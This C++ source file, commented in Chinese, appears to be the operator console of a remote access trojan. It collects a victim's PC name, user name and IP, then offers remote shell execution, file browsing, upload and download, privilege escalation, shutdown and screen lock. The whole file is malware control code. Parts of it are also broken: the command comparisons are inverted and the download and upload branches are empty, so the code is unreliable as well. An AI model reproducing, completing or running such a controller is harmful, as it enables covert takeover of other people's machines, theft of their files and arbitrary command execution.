#include "../tcpSocket/tcpSocke.h"


int process(SOCKET clifd);
int main()
{
	init_Socket();

	SOCKET serfd = CreatServerScoket();

	cout << "wait client connect...\n";

	SOCKET clifd = accept(serfd, NULL, NULL);	//如果有客户端请求连接
	if (clifd == INVALID_SOCKET)
	{
		//err("accept");
	}
	char buf[BUFSIZ] = { 0 };

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//接受连接成功并输出
	{
		decode(buf);
		cout << buf << endl;
	}
	memset(buf, 0, sizeof(buf));//缓冲区初始化，防止重复输出

	if (recv(clifd, buf, BUFSIZ, 0) > 0)
	{
		decode(buf);
		cout << "PCName is :" << buf << endl;
	}
	memset(buf, 0, sizeof(buf));

	if (recv(clifd, buf, BUFSIZ, 0) > 0)
	{
		decode(buf);
		cout << "UserName is :" << buf << endl;
	}
	memset(buf, 0, sizeof(buf));

	if (recv(clifd, buf, BUFSIZ, 0) > 0)
	{
		decode(buf);
		cout << "IP is :" << buf << endl;
	}
	memset(buf, 0, sizeof(buf));

	while (true)//心跳功能
	{
		int i = 0;
		recv(clifd, buf, BUFSIZ, 0);
		decode(buf);
		cout << buf << endl;
		if (i==0)
		{
			thread th = thread(process, clifd);
			th.join();
		}
		i = 1;
	}

	close_Socket();
	return 0;
}

int process(SOCKET clifd)
{
	char code[50] = { 0 };
	char sendbuf[BUFSIZ] = { 0 };
	while (true)
	{
		ZeroMemory(code, sizeof(code));
		cout << endl;
		cout << "Enter prompt: " << endl;
		cout << "1.filebrowse: File browsing				2. shell: Execute shell instructions  " << endl;
		cout << "3.download: File download					4. upload: File upload" << endl;
		cout << "5.upright: Get administrator privileges	6. kill: Kill the terminal" << endl;
		cout << "7.shutdown: shutdown the pc				8. reboot: Restart the computer	" << endl;
		cout << "9. cancel: Cancel shutdown					10.lock: Lock Screen" << endl;
		cout << "Please enter the corresponding instruction:" << endl;
		cin >> code;
		encode(code);
		send(clifd, code, 50, 0);
		if (strcmp(code, "filebrowse"))
		{
			for (int i = 0; i < FileNameCol; i++)
			{
				char Zero[BUFSIZ] = { 0 };
				recv(clifd, sendbuf, FileNameRow, 0);
				if (strcmp(sendbuf, Zero) != 0)
				{
					decode(sendbuf);
					cout << sendbuf << endl;
				}
				ZeroMemory(sendbuf, sizeof(sendbuf));
			}
		}
		else if (strcmp(code, "shell"))
		{
			char shell[50] = { 0 };
			char res[BUFSIZ * 2] = { 0 };
			cout << "Enter a shell command" << endl;
			cin >> shell;
			send(clifd, shell, 50, 0);

			recv(clifd, res, BUFSIZ * 2, 0);
		}
		else if (strcmp(code, "download"))
		{

		}
		else if (strcmp(code, "upload"))
		{

		}

	}
}